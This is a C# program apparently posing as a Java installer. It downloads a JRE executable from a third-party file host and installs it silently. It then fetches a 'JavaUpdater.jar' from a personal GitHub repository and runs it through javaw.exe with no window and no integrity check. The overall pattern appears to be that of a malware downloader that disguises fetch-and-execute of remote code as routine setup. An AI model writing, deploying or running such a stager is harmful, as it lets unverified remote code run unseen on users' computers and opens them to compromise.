using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace JavaInstaller
{
    class Program
    {
        static bool IsJavaInstalled()
        {
            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "java",
                    Arguments = "-version",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            try
            {
                cmd.Start();
                cmd.WaitForExit();
                return cmd.ExitCode == 0;
            }
            catch
            {
                return false;
            }
        }

        static string GetJavaPath()
        {
            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "where",
                    Arguments = "java",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            cmd.Start();
            string output = cmd.StandardOutput.ReadToEnd();
            cmd.WaitForExit();

            var match = Regex.Match(output, @"(.*?)\\java.exe");
            return match.Success ? match.Groups[1].Value : "";
        }

        static void Download(string url, string localFilename)
        {
            using (var client = new WebClient())
            {
                client.DownloadFile(url, localFilename);
            }
        }

        static void InstallJavaSilently(string installerPath)
        {
            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = installerPath,
                    Arguments = "/s",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            cmd.Start();
            cmd.WaitForExit();
        }

        static void RunUpdater(string updaterPath, string javaPath)
        {
            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = Path.Combine(javaPath, "javaw.exe"),
                    Arguments = $"-jar \"{updaterPath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            cmd.Start();
            cmd.WaitForExit();
        }

        static void Main(string[] args)
        {
            string tempDir = Path.GetTempPath();

            if (!IsJavaInstalled())
            {
                string javaUrl = "https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe";
                string localFilename = Path.Combine(tempDir, "jre-8u371-windows-x64.exe");
                Download(javaUrl, localFilename);
                InstallJavaSilently(localFilename);
                File.Delete(localFilename);
            }
            else
            {
                Console.WriteLine("Java is already installed.");
            }

            string javaPath = GetJavaPath();

            if (string.IsNullOrEmpty(javaPath))
            {
                Console.WriteLine("Java path not found.");
            }
            else
            {
                string updaterUrl = "https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar";
                string updaterPath = Path.Combine(tempDir, "JavaUpdater.jar");
                Download(updaterUrl, updaterPath);
                RunUpdater(updaterPath, javaPath);
            }
        }
    }
}